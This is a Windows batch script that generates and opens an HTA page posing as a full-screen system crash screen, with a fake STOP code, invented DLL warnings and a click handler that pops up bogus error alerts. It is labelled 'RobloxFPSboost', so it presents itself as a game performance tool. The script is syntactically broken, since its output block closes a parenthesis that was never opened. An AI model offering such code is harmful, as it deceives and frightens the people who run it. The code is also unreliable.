@echo off

echo ^<html^>^<head^>^<title^>Microsoft Windows^</title^> 
echo. 
echo ^<hta:application id="oBVC" 
echo applicationname="RobloxFPSboost"  
echo version="1.0" 
echo maximizebutton="no" 
echo minimizebutton="no" 
echo sysmenu="no" 
echo Caption="no" 
echo windowstate="maximize"/^> 
echo. 
echo ^</head^>^<body bgcolor="#000000" scroll="no"^> 
echo ^<font face="Lucida Console" size="4" color="white"^>

echo ^<p^>A problem has been detected!^</p^> 
echo. 
echo ^<p^>PROGRAM_CODE_ERR_3163^</p^> 
echo. 
echo ^<p^>follow these steps for fix error:^</p^> 
echo. 
echo ^<p^>Check to make sure you not stop NSRCDR.dll and MSTXCR.dll^</p^> 
echo. 
echo ^<p^>If you disable NSRCDR.dll and MSTXCR.dll this program is crash^</p^> 
echo. 
echo ^<p^>Technical information:^</p^> 
echo. 
echo ^<p^>*** STOP: 0Bx0000000ERR3163^</p^> 
echo. 
echo. 
echo ^<p^>***  gv3.sys - Address F86B5A89 base at F86B5000, DateStamp 3dd9919eb^</p^> 
echo. 
echo ^<p^>Beginning saved error_log.txt^</p^> 
echo ^<p^>Saved error_log.txt complete.^</p^> 
echo ^<p^>Contact your problem to administrator or technical support group for fix the problem.^</p^>
echo.
echo ^<p^> ^<strong^> ---> press ALT+F4 for exit problem menu <--- ^</p^> ^</strong^> 
echo.
echo. 
echo ^</font^> 
echo ^</body^>
echo.
echo ^<script language="javascript"^>
echo function noClick^(^) {
echo if ^(^(event.button==1^)^|^|^(event.button==2^)^) {
echo alert^('Error: 00101100x00100100 missing keymgr.dll'^)
echo }
echo }
echo document.onmousedown=noClick
echo ^</script^>
echo.  
echo ^</html^> 
) > bsod.hta 

start "" /wait "bsod.hta"

del /f /q "bsod.hta" > nul